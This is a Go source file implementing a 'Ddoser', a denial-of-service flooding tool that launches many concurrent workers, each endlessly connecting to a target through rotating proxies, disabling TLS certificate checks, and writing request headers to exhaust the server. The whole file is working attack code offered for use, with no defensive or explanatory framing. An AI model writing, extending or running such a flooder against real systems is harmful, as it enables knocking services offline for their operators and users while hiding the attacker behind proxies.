package main

import (
	"crypto/tls"
	"fmt"
	"net"
	"net/url"
	"time"

	"github.com/valyala/fasthttp/fasthttpproxy"
)

type Ddoser struct {
	url        *url.URL
	numWorkers int
	headers    []string
	proxies    []string
}

func NewDdoser(u *url.URL, number int, headers, proxies []string) (*Ddoser, error) {
	if u.Hostname() == "" || u.Port() == "" {
		return nil, fmt.Errorf("missing Hostname or Port")
	}

	return &Ddoser{
		url:        u,
		numWorkers: number,
		headers:    headers,
		proxies:    proxies,
	}, nil
}

func (d *Ddoser) Run() {
	for i := 0; i < d.numWorkers; i++ {
		addr := net.JoinHostPort(d.url.Hostname(), d.url.Port())
		go func() {
			var conn net.Conn
			var err error
			for {
				conn, err = fasthttpproxy.FasthttpHTTPDialerTimeout(random(d.proxies), time.Second*5)(addr)

				if err != nil {
					// Skip to another proxy
					continue
				}

				if d.url.Scheme == "https" {
					// Skip tls verification
					conn = tls.Client(conn, &tls.Config{
						ServerName:         d.url.Hostname(),
						InsecureSkipVerify: true,
					})
				}

				for i := 0; i < len(d.headers); i++ {
					if _, err = conn.Write([]byte(d.headers[i])); err != nil {
						conn.Close()
						break
					}
				}
			}
		}()
	}
}
